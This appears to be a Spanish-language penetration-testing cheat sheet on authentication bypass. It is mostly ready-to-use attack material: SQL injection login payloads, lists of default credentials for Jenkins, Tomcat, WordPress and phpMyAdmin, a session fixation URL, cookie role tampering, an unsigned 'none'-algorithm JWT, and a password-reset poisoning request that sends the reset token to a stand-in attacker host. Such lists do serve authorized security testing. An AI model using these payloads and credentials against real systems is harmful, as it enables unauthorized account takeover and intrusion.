

### Metodología

1. **Analizar mecanismo de autenticación**: Revisar cómo se validan credenciales
2. **Probar SQLi en login**: Intentar bypass con payloads SQL
3. **Testear credenciales por defecto**: Probar combinaciones comunes
4. **Manipular sesiones/cookies**: Modificar valores de autorización
5. **Explotar lógica débil**: Password reset, cambio de respuesta, session fixation

### Bypass con SQL Injection

```sql
-- En username
admin' --
admin' #
admin'/*
' OR '1'='1' --
admin' OR '1'='1

-- En password
' OR '1'='1' --
password' OR 1=1 --
```


### Bypass con condiciones siempre verdaderas

```sql
# Username: admin
# Password: ' OR '1'='1
SELECT * FROM users WHERE username='admin' AND password='' OR '1'='1'
```


### Bypass de autenticación débil

```ruby
# Usuarios por defecto
admin:admin
administrator:administrator
root:root
admin:password
admin:123456

# Credenciales comunes
admin:admin123
user:user
test:test
guest:guest
```


### Session fixation

```http
# 1. Obtener session ID
http://vulnerable.com/login.php?PHPSESSID=attacker_session

# 2. Víctima inicia sesión con esa session
# 3. Atacante usa la misma session ID
```


### Cookie manipulation

```http
# Cambiar rol en cookie
Cookie: user=admin; role=administrator

# JWT débil
Cookie: token=eyJ0eXAiOiJKV1QiLCJhbGciOiJub25lIn0.eyJ1c2VyIjoiYWRtaW4ifQ.

# Cookie desencriptada
Cookie: user=YWRtaW4= (base64 de "admin")
```


### Password reset poisoning

```http
# Host header injection
POST /reset-password HTTP/1.1
Host: atacante.com
...

# El link de reset se envía a attacker.com con el token
```


### Default credentials en aplicaciones comunes

```ruby
# Jenkins
admin:password

# Tomcat
admin:admin
tomcat:tomcat

# WordPress
admin:admin

# PHPMyAdmin
root:(vacío)
root:root
```


